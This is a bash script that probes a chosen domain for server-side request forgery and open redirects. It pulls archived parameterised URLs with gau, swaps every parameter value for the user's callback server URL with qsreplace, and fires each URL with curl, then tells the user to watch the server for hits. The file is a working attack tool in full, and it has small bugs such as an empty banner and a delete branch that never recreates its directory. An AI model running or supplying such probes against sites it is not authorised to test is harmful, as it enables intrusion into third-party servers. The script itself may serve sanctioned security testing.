#!/bin/bash

#######################
#### Colors Output ####

RESET="\e[0m"
GRAY="\e[1;30m"
RED="\e[1;31m"
GREEN="\e[1;32m"
YELLOW="\e[33m"
BLUE="\e[1;34m"       # Keeping the lighter blue
PURPLE="\e[1;35m"
CYAN="\e[1;36m"
WHITE="\e[1;37m"

###############################

banner() {
    clear
    echo
    echo -e "${CYAN}"
}

if [ $# -eq 0 ]; then
    banner
    exit 1
fi

while [ $# -gt 0 ]; do
    case "$1" in
    "-h" | "--help")
        banner
        exit 2
        ;;

    "-d" | "--domain")
        DOMAIN=$2
        shift 2
        ;;

    "-s" | "--server")
        SERVER=$2
        shift 2
        ;;

    *)
        banner
        exit 1
        ;;
    esac
done

if ! [ -d "$DOMAIN" ]; then
    mkdir "$DOMAIN"
    cd "$DOMAIN"
else
    echo "Directory already exists ... Exiting ...."
    echo -n "[+] Do you want to delete the dir? [y|n]: "
    read input
    if [[ "$input" == "y" || "$input" == "Y" ]]; then
        rm -rf "$DOMAIN"
    else
        echo "Exiting without changes."
        exit 1
    fi
fi

###########################################################

banner
echo
echo -e "${BLUE}[-] Gathering URLs and replacing them with server URL... ${RESET}"

# Gathering URLs and replacing them with the server URL
gau "$DOMAIN" | grep "=" | qsreplace "$SERVER" >> parameters.txt
echo 
echo -e "${GREEN}[+] Completed ... ${RESET}"
echo 

echo -e "${BLUE}[-] Firing URLs, check your server... ${RESET}"

# Firing the URLs
cat parameters.txt | while read -r line; do
    curl "$line"
done

echo "Check your server for any request..."
